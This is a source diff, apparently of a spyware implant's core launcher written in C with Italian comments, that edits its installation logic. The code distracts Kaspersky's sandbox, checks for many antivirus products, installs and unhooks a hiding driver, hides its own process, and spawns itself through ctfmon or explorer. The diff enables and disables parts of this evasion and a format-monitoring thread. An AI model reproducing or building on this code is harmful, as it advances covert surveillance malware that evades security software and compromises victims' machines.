@@ -1716,14 +1716,14 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Cerca di "distrarre" la sandbox di kaspersky
 	HIDING();
 
-	HideDevice dev_probe;
+	//HideDevice dev_probe;
 	
 	// Ci sono degli AV con cui proprio non si deve installare
 	if (IsBlackList())  {
 		ReportCannotInstall();
 		return;
 	}
-
+#if 0
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
@@ -1750,12 +1750,12 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 			dev_unhook.unhook_all(FALSE);
 		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
-#if 0
+
 		if ((IsAvira() || IsBlink() || /*IsKaspersky() ||*/ IsKerio() || IsPGuard() || IsComodo2() || IsComodo3() || IsPanda() || /*IsTrend() ||*/ IsEndPoint()) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
 			ReportCannotInstall();
 			return;
 		}
-#endif
+
 		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
 		if (IsDeepFreeze()) {
 			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, FALSE)) {
@@ -1765,7 +1765,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 			}
 		}
 	}
-
+#endif
 	// ---------------------------------------------
 	HANDLE hToken = GetMediumLevelToken();
 	if (IsAVG_IS() || IsFSecure() || IsKaspersky()) {
@@ -1779,8 +1779,8 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 		HM_CreateProcessAsUser(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE), hToken);
 	} else // Non c'e' zonealarm e usa explorer
 		HM_CreateProcessAsUser(cmd_line, flags, si, pi, 0, hToken);
-	HideDevice dev_unhook;
-	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
+	//HideDevice dev_unhook;
+	//dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
 }
 
 // Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
@@ -2959,7 +2959,7 @@ void __stdcall HM_sMain(void)
 	SM_StartMonitorEvents();
 
 	// Lancia il thread per il monitoraggio della formattazione
-	StartFormatThread();
+	//StartFormatThread();
 
 	REPORT_STATUS_LOG(ss7.get_str());
 	SendStatusLog(L"[Core Module]: Started");
